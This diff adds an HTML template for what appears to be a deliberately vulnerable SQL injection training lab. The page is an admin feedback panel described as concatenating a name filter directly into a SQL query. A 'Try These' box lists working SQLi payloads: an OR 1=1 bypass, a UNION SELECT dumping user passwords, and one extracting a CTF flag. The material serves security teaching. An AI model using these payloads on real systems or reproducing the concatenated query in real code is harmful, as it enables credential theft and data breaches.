@@ -1,0 +1,84 @@
+{% extends "base.html" %}
+
+{% block title %}Admin Feedback - SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">🛡️ Admin Feedback Panel</span>
+        <span class="badge badge-danger">Vulnerable: Second-Order SQLi (Execution)</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+        This is the <strong>execution phase</strong> of Second-Order SQL Injection.
+        The <code>name</code> filter parameter is directly concatenated into a SELECT query.
+        Any malicious payload stored via <code>/feedback</code> will execute here.
+    </p>
+    <form method="GET" action="{{ url_for('admin_feedback') }}">
+        <div style="display: flex; gap: 12px;">
+            <input type="text" name="name" value="{{ name_filter }}" placeholder="Filter by name..." style="flex: 1;">
+            <button type="submit" class="btn btn-primary">Filter</button>
+            <a href="{{ url_for('admin_feedback') }}" class="btn btn-outline">Show Approved</a>
+        </div>
+    </form>
+    {% if executed_query %}
+    <div class="query-box">
+        <span class="label">Executed SQL Query</span>
+        <code>{{ executed_query }}</code>
+    </div>
+    {% endif %}
+    {% if error %}
+        <div class="alert alert-danger">{{ error }}</div>
+    {% endif %}
+</div>
+
+{% if results %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">Feedback Entries ({{ results|length }} found)</span>
+    </div>
+    <table class="data-table">
+        <thead>
+            <tr><th>ID</th><th>Name</th><th>Email</th><th>Message</th><th>Approved</th><th>Date</th></tr>
+        </thead>
+        <tbody>
+            {% for row in results %}
+            <tr>
+                <td>{{ row.id }}</td>
+                <td><code>{{ row.name }}</code></td>
+                <td>{{ row.email }}</td>
+                <td>{{ row.message }}</td>
+                <td>
+                    {% if row.is_approved %}
+                        <span class="badge badge-success">Yes</span>
+                    {% else %}
+                        <span class="badge badge-warning">No</span>
+                    {% endif %}
+                </td>
+                <td>{{ row.created_at }}</td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
+{% elif name_filter %}
+    <div class="alert alert-info">No feedback found for name: <code>{{ name_filter }}</code></div>
+{% endif %}
+
+<div class="card" style="border-color: var(--warning); margin-top: 20px;">
+    <div class="card-header">
+        <span class="card-title" style="color: var(--warning);">⚡ Try These in the Name Filter</span>
+    </div>
+    <div class="payload">
+        <div class="payload-label">See ALL feedback including unapproved (stored via /feedback)</div>
+        ' OR '1'='1' --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Inject users table into results</div>
+        ' UNION SELECT id, username, password, email, role FROM users --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Get the CTF flag</div>
+        ' UNION SELECT id, secret_key, secret_value, description, 'flag' FROM secrets WHERE secret_key='FLAG' --
+    </div>
+</div>
+{% endblock %}
